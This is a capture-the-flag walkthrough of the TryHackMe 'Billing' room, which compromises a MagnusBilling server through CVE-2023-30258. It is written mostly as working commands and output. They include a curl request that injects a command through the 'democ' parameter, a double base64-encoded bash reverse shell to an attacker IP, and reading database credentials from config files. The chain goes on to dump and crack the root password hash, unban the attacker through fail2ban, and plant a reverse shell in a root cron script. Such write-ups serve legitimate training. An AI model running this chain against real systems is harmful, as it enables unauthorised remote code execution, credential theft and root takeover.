# TryHackMe Billing
```
sudo nmap -sC -sV -p- 10.XX.XX.XX
```
> TCP
```python
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.XX.XX.XX/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```
```sh
sudo nmap -sU 10.XX.XX.XX
```
> UDP
```python
123/udp open  ntp
```

### **MagnusBilling**

![image](https://github.com/RunasRs/Billing/assets/165502296/a7a549d3-4a9c-406f-8f62-df89861f2e1e)

[**CVE-2023-30258**](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

Commit : Vulnerability in [icepay.php](https://github.com/magnussolution/magnusbilling7/commit/ccff9f6370f530cc41ef7de2e31d7590a0fdb8c3)

  
```php
if (isset($_GET['demo'])) {

    if ($_GET['demo'] == 1) {
        exec("touch idepay_proccess.php");
    } else {
        exec("rm -rf idepay_proccess.php");
    }
}
if (isset($_GET['democ'])) {
    if (strlen($_GET['democ']) > 5) {
        exec("touch " . $_GET['democ'] . '.txt');
    } else {
        exec("rm -rf *.txt");
    }
}
```

**POC**
```sh
curl 'http://10.XX.XX.XX/mbilling/lib/icepay/icepay.php?democ=null;PAYLOAD;null'
```
**PAYLOAD**
```
echo 'bash -i >& /dev/tcp/10.11.XX.XX/7777 0>&1' | base64 | base64
```
```sh
echo%20"WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNUzVZV0M1WVdDODNOemMzSURBK0pqRUsK"|base64%20-d|base64%20-d|bash
```

# Exploitation
```sh
curl 'http://10.XX.XX.XX/mbilling/lib/icepay/icepay.php?democ=null;echo%20"WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNUzVZV0M1WVdDODNOemMzSURBK0pqRUsK"|base64%20-d|base64%20-d|bash;null'
```
* **Listening on kali.**

┌──(kali㉿kali)-[~]
```sh
nc -lvnp 7777
...
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ whoami
asterisk
```
* **Stabilization of our shell.**
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

# Search

* **If we follow the track of the cron task, we should find interesting things.**

┌── asterisk@Billing:/$
```sh
cat /etc/crontab

* * * * * root php /var/www/html/mbilling/cron.php cryptocurrency 
* * * * * root php /home/magnus/install/check.php
```
* **Let’s check what cron.php contains.**

┌── asterisk@Billing:/$
```sh
cat /var/www/html/mbilling/cron.php
```
```r
// Definicao do framework e do arquivo de config da aplicacao
$yii    = dirname(__FILE__) . '/yii/framework/yii.php';
$config = dirname(__FILE__) . '/protected/config/cron.php';
```
* **Let’s check what cron.php in the protected folder contains.**

┌── asterisk@Billing:/$
```sh
cat /var/www/html/mbilling/protected/config/cron.php
```
* **This one refers to res_config_mysql.conf, let’s see more in this file.**
```r
$configFile = '/etc/asterisk/res_config_mysql.conf';
```
* **Ok, we found credentials to log into the database.**

┌── asterisk@Billing:/$
```sh
cat /etc/asterisk/res_config_mysql.conf
```
```
[general]
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = XXXXXXXXXXXXXXXXX
```
```sh
mysql -h localhost -u mbillingUser -p
```
```sh
show databases;
```

```r
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mbilling           |
+--------------------+
```
```sh
use mbilling;
show tables;
```
```r
| pkg_user                    |
| pkg_user_history            |
| pkg_user_rate               |
| pkg_user_type               |
| pkg_voicemail_users         |
| pkg_voucher                 |
+-----------------------------+
```
* **The pkg_user table contains the user root password of the application (sha-1).**
```sh
select * from pkg_user;
```
```r
root | XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
* **We will have to crack the password with hashcat.**

┌──(kali㉿kali)-[~]
```sh
hashcat -m 100 hash.txt /home/kali/rockyou.txt 
```
* **Ok, we find a match !**
```r
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:PASSWD
```
* **Now we can check if magnus used his password to set up the application root account.**

* **The su function does not seem to work, we will have to try to connect in ssh.**

┌──(kali㉿kali)-[~]
```sh
ssh magnus@10.XX.XX.XX
```

* *If the attacker brute-forced the magnus password, his ip will be banned but asterisk has the power to remove his ban.*
```r
ssh: connect to host 10.XX.XX.XX port 22: Connection refused
```
┌── asterisk@Billing:/$
```
sudo /usr/bin/fail2ban-client status sshd
```
```R
- Actions
   |- Currently banned:	1
   |- Total banned:	1
   `- Banned IP list:	10.11.XX.XX
```
┌── asterisk@Billing:/$
```sh
sudo /usr/bin/fail2ban-client unbanip 10.11.XX.XX
```
---
┌──(kali㉿kali)-[~]
```sh
ssh magnus@10.XX.XX.XX
```
* **We can now display the contents of** */home/magnus/user.txt*
```css
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

# PrivEsc

┌── magnus@Billing:/$
```sh
cat /etc/crontab
```
```r
* * * * * root php /var/www/html/mbilling/cron.php cryptocurrency 
* * * * * root php /home/magnus/install/check.php
```
* **A misconfiguration of the second cron job launches a php script as root that is writable by magnus.**

* **Just place a payload in the check.php script and listen on kali.**

┌──(kali㉿kali)-[~]
```SH
nc -lvnp 7777
```
**PAYLOAD**
*/home/magnus/install/check.php*
```php
<?php 
exec('echo "WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNUzVZV0M1WVdDODNOemMzSURBK0pqRUsK"|base64 -d|base64 -d|bash')
?>
```

┌──(kali㉿kali)-[~]
```sh
nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.11.XX.XX] from (UNKNOWN) [10.XX.XX.XX]
root@Billing:~# whoami
root
```
*/root/root.txt*
```css
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
